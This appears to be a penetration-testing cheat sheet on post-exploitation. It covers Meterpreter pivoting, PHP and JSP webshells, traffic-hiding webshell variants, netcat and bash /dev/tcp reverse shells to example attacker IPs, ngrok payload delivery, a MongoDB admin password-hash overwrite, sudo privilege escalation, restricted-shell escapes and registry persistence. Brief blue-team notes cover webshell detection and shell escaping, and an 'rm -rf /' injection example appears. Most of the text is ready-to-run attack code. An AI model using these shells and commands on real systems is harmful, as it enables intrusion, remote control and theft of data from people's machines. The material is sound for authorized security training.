# TABLE OF CONTENTS
1. [GENERAL](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#general)
2. [LINUX](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#linux)
3. [WINDOWS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#windows)

<br />

# GENERAL
## TABLE OF CONTENTS
2. [METERPRETER](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#meterpreter)
4. [WEBSHELL (GENERAL)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#webshell)
5. [NGROK (WEBHOOK)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#ngrok-webhook)


<br />

## METERPRETER
## Info
### Advantages
1. Works inside RAM
2. Utilizes Covert Channels (legitimate processes)
3. Encrypted communication possible (effective against IPS/IDS)
4. Staged payloads possible

## HowTo
### Basics
- `help`: command overview
- During session: Strg+Z / background --> create background session
- `sessions -l`: show existing sessions
- `sessions -u [session ID]`: upgrade to meterpreter session
- `sessions -i 2`: switch to session 2
- `download`: download from target onto local system (exp: /etc/shadow)
- `edit [file]`: open vim on target 

### Advanced Features 
#### Upload Payload (via meterpeter)
- via meterpreter session: `cd C:\ProgramData\Microsoft\Windows\Start Menu\Programme\Autostart`
- verify with "meterpreter pwd" the correct path on target
- upload [path/to/payload/on/kali]

#### Ping Sweep: 
- Detect hosts in subnet2 via target machine in subnet1 (that has access to subnet2)
   - msf: `use post/multi/gather/ping_sweep`
   - `set rhost [IPv4]` (IPv4 from subnet2 like 10.1.0.0/24)
   - `set session [id]` (use id from target in subnet1)
- Alternative: `use auxiliary/scanner/portscan/tcp` + specify ports

#### Remote TCP scanner
1. msf: `use auxiliary/scanner/portscan/tcp` & set ports + rhost
2. Because it's "auxiliary" and not "post", you need to set up a route beforehand
3. msf: `route add [target in subnet] [sessionid]` (Exp: route add 10.1.0.7 1)
4. Alternative via meterpreter session: `run autoroute -s [target in subnet]`
5. These routes are only effective inside mp session (!)
6. For the usage outside of meterpreter session you need to set up portforwarding
7. Meterpreter session: `portfwd add -l 80 -p 80 -r [target in subnet]`

#### Proxychains:

*Route tools' web traffic through socks proxy to target2 w/o portforwading (!)*

1. Meterpreter: have existing session to target1 & put session into background
2. msf: `use auxiliary/server/socks_proxy` & setup socks4a(127.0.0.1:123) & `run` & `jobs`
3. Meterpreter: `add autoroute -s [IPv4]` (IPv4 = target2 IP in subnet)
4. msf: `route print` (check routing table)
5. Kali Browser: set up socks proxy (127.0.0.1:123) (now you can browse on target2 machine)
6. `nano /etc/proxychains.conf`: add `socks 127.0.0.1 123` at the end of file
7. Kali CLI: `proxychains [command] [IPv4]` (target2 IP in subnet)

<br />

## WEBSHELL
## Info
- A script, which is written in language of target web server, to enable remote access (via HTTP) of the machine
- Usually installed via:
   - Document/file upload pages
   - Local File Include (LFI): Put webshell in page of webapp
   - Cross-site scripting (XSS)
   - Exposed Admin Interface (e.g. OWA/Outlook Web App, EAS/Exchange ActiveSync)

### Best Practice (Blue Team)
- Set `allow_url_include` to "false" (Code Injection Prevention)
- Use `file_get_contents` to load ads etc. on your website, if any (this will reduce the attack surface, but XSS is still possible)
- Configure .htaccess properly
- **Wrong**: `<?php system('ls ' . $_GET['path']); ?>`  --> ls ; rm -rf /
    - the commmand `ls` gets interrupted and the attacker can enter another command like `rm -rf /`, which will delete the entire directory 
- **Good**: `<?php system('ls ' . escapeshellarg($_GET['path'])); ?>` --> ls 'rm -rf /'
    - the execution of malicious code is prevented since it gets interpreted as string
- How to detect webshells:
    - Oberserve web server access/error logs
    - Notice of unusual timestamps
    - Search for common strings in files or filenames (passthru|exec|eval...)
    - Webshell signature scanner
    - Search for very long strings, which may indicate encoding
    - Search for files that were modified in the recent X days
        - `find -name '*.php' -mtime -1`
- Search for htaccess modification (false filename-extension mapping)
   - `addType application/x-httpd-php .htaccess`
   - `addType application/x-httpd-php .jpg`
- Be aware of **CGI** (Common Gateway Interface):
   - Data exchange between webserver and Third Party SW
   - Used for first dynamic web site development back in old days
   - Forwarding of web requests to web server shell (ShellShock!)

## HowTo
### Return list of dangerous enabled functions
```
<?php

//print_r = print variable information in readable form

print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

### Typical Webshell Commands
- `<?php system("whoami"); ?>`
- `<?php exec("whoami"); ?>`: Executes but returns nothing
- `<?php echo exec("whoami"); ?>`
- `<?php exec("whoami", $array); print_r($array); ?>`: Executes, returns output in array
- `<?php echo shell_exec("whoami"); ?>`: Executes, returns string
- `<?php passthru ("whoami"); ?>`: Executes, returns raw format
- ```<?php echo "<pre>`whoami`</pre>"); ?>```
- `<?php system($_GET['c']);?>`: www.example.com/demo/shell.php?c=whoami (`?c=` when your code is already on the web server)
- `<?php system($_GET['c']);?>`: www.example.com?page=http://yourSite.com/yourMaliciousScript.txt&c=whoami (`&c=` when code is incoporated in php include())
    - Example remote script phpinfo(): `https://assets.pentesterlab.com/test_include.txt`
    - Example remote script system(): `https://assets.pentesterlab.com/test_include_system.txt`

### Webshells with netcat
```
<?php

// 1) Upload backdoor.php on web server
// 2) Enter URL --> http://example.com/backdoor.php?c=nc -e /bin/sh 10.10.10.7 4444

if(isset($_REQUEST['c'])){
        echo "<pre>";
        $c = ($_REQUEST['c']);
        system($c);
        echo "</pre>";
        die;
}
?>
```
### Webshell with interactive Bash Shell
```
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'"); ?>

# Shell traffic is routed to attacker machine with example IPv4 10.0.0.10 at port 1234
# `0>&1` = STDIN is redirected to STDOUT
```

### Webshell.jsp
- Credits: [https://cxsecurity.com/issue/WLB-2018090134](https://cxsecurity.com/issue/WLB-2018090134)
- **CVE-2018-1306**
```
<FORM METHOD=GET ACTION='webshell.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

### Hide Webshell Traffic
1. `<?php system($_SERVER['HTTP_USER_AGENT'])?>`: Modify HTTP_USER_AGENT accordingly
2. `<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>`: Hide traffic along with uncommon parameter HTTP_ACCEPT_LANGUAGE
3. `<?php $_=$_POST['1'];  $__=$_POST['2']; $_($__); ?>`
    - Send POST request with variable '1' = 'system' and variable '2' = 'cat /etc/passwd'
    - The term `$_($__)` becomes then `system('cat /etc/passwd')`

### Weevly (Weaponized Webshell)
- Check out: [https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

<br />

## NGROK (WEBHOOK)
## Info
- Establish remote connection through Internet to LAN-target
- [https://ngrok.com/](https://ngrok.com/)

## HowTo
1. Download ngrok and sign up
2. Unzip ngrok
3. Enter `./ngrok authtoken [token]` 
4. `./ngrok http 8080`
5. New terminal shows ngrok session with public IP:port 
6. Open msfvenom: create payload with lhost and lport matching ngrok's public IP:port 
7. Open msf: Activate multi handler with lhost/lport according to ngrok session info (localhost:8080)
8. Execute payload on target machine to establish remote connection

<br />

# LINUX
## TABLE OF CONTENTS
1. [ARP](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#arp)
2. [MONGODB](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#mongodb)
3. [SHELL (INTERACTIVE & STABLE)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#shell-interactive--stable)
4. [PORT/PROCESS DETECTION](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#portproces-detection)
5. [PRIVILEGE OF ESCALATION (LINUX)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#privilege-of-escalation-linux)
6. [RESTRICTED SHELL ESCAPE](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#restricted-shell-escape)

<br />

# ARP
## Info
- *ARP = Address Resolution Protocol*
- With ARP you can exploit IP-to-MAC resolution to steal/modify/redirect frames
- ARP allows MITM/DoS attacks

## HowTo
### ARP Scans
- `arp-scan --localnet`
- `arp -a`: On Windows (show all arp-cache)

<br />

## MONGODB
## HowTo
- `mongo host:port`: for instance `mongo localhost:27117`
- `mongo <HOST>:<PORT>/<DB>
- `mongo -u <USER> -p <PASSWORD> <HOST>:<PORT> --authenticationDatabase <AUTH_DB>`
- **After Authentication**
- `show dbs`
- `show collections`
- `db.mycoll.help()`
- `db.admin.find().forEach(printjson);`
- `db.admin.insert()`: Add data to admin object
- `db.admin.update()`: Change data of amin object 
   -  `"_id" : ObjectId("61..ee4"),"name" : "admin","email" : "ad...b",	"x_shadow" : "$6$Ry6Vd..QETt4."`: Identify hash type **$6** (SHA512)
   - `mkpasswd -m sha-512 password123`: Create alternative password like `password123`
   - `db.admin.update({"_id" : ObjectId("61ce2..7ee4")},{$set:{"x_shadow":"$6$7CMtDpvcMoct...0Y4rbU/gd8/"}})`

<br />

## SHELL (INTERACTIVE & STABLE)
## HowTo
### Bind Shell
- Victim: `nc -vnlp 4444 -e cmd.exe`
- Attacker: `nc [IPv4] 4444`

### Reverse Shell
- Victim: `nc -vn [IPv4] 443 -e cmd.exe`
- Attacker: `nc -nvlp 443`

### Instable Shell
- Example: `sqlmap --os-shell`
- Improvements:
- A) `bash -c "bash -i >& /dev/tcp/10.10.10.10/8080 0>&1"`: Insert your IP and Port
- B) `script /dev/null -c bash`: turn your shell into an interactive shell
- C) 
    - `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Further options in [spawning a Shell](https://netsec.ws/?p=337)
    - `Ctrl+Z` or `bg`
    - `stty raw -echo`: input / output is not processed, just sent straight through; do not echo back every character typed
    - `fg`
    - `export TERM=xterm`
    - **Hint**: 
    - `settings=$(stty -g) `: save your current TTY settings before using `stty`
    - `stty $settings`: restore stty settings after you have finished

<br />

## PORT / PROCESS DETECTION
## HowTo
-  `netstat -tulpn` or `ss`: display network connections, routing tables, NW interface statistics
- `fuser`: identify processes using files or sockets
- `lsof`: list open files under Linux / UNIX
- `/proc/$pid/`: Containing information about that process, notably including the processes name that opened port
- `cat /etc/mongodb.conf`: ports are sometimes hardcoded in config files
- `ps -p 68 -o command` or `ps aux | grep mongo`: get details of running processes

<br />

## PRIVILEGE OF ESCALATION (LINUX)
## Info
- **RUID** (Real User ID): Describes user who created the process
- **EUID** (Effective User ID): Describes user whose file access permissions are used by the process

### Interesting Spots
- **System Paths**
    - `etc/shells`: check valid login shells
    - `/etc/sudoers`: check sudo user policy
    - `/etc/pam.d/common-password`: check enabled PW hash algorithm
    - `/var/www/html`: especially if SQL and/or PHP is installed
- **(Config) Files**
    - watch out for config files which may contain sensitive data and/or passwords
    - `find / -user root -perm -4000 -exec ls -ldb {} \;`: find all SUID files
    - `cat * | grep -i passw*`
    - `ls -la file && file file`: check privileges and type of file
- **Tools**
    - check out which tools are installed on the victim machine
    - these tools may reveal a chance to escalate your privileges
- **System Accounts / Users**
    - check out which accounts have allowed shell access
    - system accounts (besides root) may have shell access even though their functionality does not require it
    - `sudo -l`: Reveal allowed sudo commands for current user
    - `id`: check the groups a user is belonging to
    - `find / -group [groupname] 2>/dev/null`: search for files assigned to this group

## HowTo
### SETUID
- write script file.c (as unprivileged user)
```
int main(void)
{
system("cat /file/to/path");
}
```
- then perform below CLI operations
    - `gcc file.c -o file`
    - `chmod +xs file`: perform as privileged user
    - `./file`: as unprivileged user

### PERL
```
sudo -u victim /usr/bin/perl -e '`/bin/bash`'
sudo -u victim /usr/bin/perl -e 'print `cat /home/victim/key.txt`;': with single quotes
sudo -u victim /usr/bin/perl -e "print `cat /home/victim/key.txt`;": with double quotes
```

### PYTHON
- `sudo -u victim python -c 'import os; os.system("cat /home/victim/key.txt")'`

### RUBY
- IRB = Interactive Ruby
- IRB is a Read-Eval-Print Loop, or REPL, a tool offered by many modern programming languages
- launch the irb executable and type your Ruby code at the prompt
- IRB evaluates the code you type and displays the results
```  
/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
# you will get following prompt
irb(main):001:0> 
# use system commands with backticks
irb(main):001:0> `cat /home/victim/key.txt`
```

### JAVASCRIPT
- The child_process module acts as a namespace for spawn(), exec(), execFile(), and fork() functions.
- You call require("child_process") to refer to the module, and then call one of its member functions to create a new process.
- The return value is a ChildProcess object, which has members like stdin, stdout, and pid
- [DOC](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)

```
var exec = require('child_process').exec;
exec('[COMMAND]', function (error, stdOut, stdErr) {
console.log(stdOut);
});
```
- Note the quotes, if used in conjunction with another command
- Otherwise an error message might occur
```
sudo -u victim node -e 'var exec = require("child_process").exec; exec("cat /home/victim/key.txt", function (error, stdOut, stdErr) {console.log(st
dOut); });'
```

<br />

## RESTRICTED SHELL ESCAPE
## Info
### Common Restricted Shells
- rbash
- rzsh
- lshell (Limited Shell)
- rssh (Restricted Secure Shell)

## HowTo
### Console Editors (ed / ne / nano / pico / vim / vi)
- `:set shell=/bin/sh; shell`
- `:!/bin/sh`
- `!'/bin/sh'`
- `sudo vi -c ':!/bin/sh' /dev/null`

### Pager Commands (more / less)
- Open a file, which is long enough to invoke pager
- `cat file | more`
- Then enter `!'sh'` or `!vi` (vim editor)

### man and pinfo
- Invoke man page
- Then enter `!'sh'` or `!vi` (vim editor)

### Console Browsers (links / lynx / elinks)
- open website (e.g. google.com)
- hit ESC, this will lead to configuration menu
- hit FILE > OS Shell

### Find command
- `find . -name [file] -exec awk 'BEGIN {system("cd /root; ls")}'`

### Expect command
- `expect; spawn sh`


<br />

# WINDOWS
## TABLE OF CONTENTS
1. [PERSISTENCE (REGISTRY)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#persistence-registry)
2. [PRIVILEGE OF ESCALATION (WIN)](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Pentest/4_PostExploitation.md#privilege-of-escalation-win)

<br />

## PERSISTENCE (REGISTRY)
## Info
**Registry: Low-Level Database in Windows**

### Autorun Key Locations
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- **Run**: Initializes values asynchronously when loading from Registry
- **RunOnce**: Initializes values in order when loading from Registry
- Attackers can gain persistence by hiding data in these keys
- Alternative persistence location: `HKLM\SYSTEM\CurrentControlSet\Services`

### Recently Used Files Location
- `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
- Preinstalled "Regedit" doesn't show last modification by default --> Use **regdump** instead 
- Malware can change file extensions of executables
- Checkout here:
   - `HKEY_CLASSES_ROOT` (HKCR)
   - `HKEY\SOFTWARE\Classes`
   - `HKCU\SOFTWARE\Classes`

### Best Practice
- Check Windows Task Scheduler (if attacker scheduled tasks)
- Check Crontab (Linux)

<br />

## PRIVILEGE OF ESCALATION (WIN)

<br />


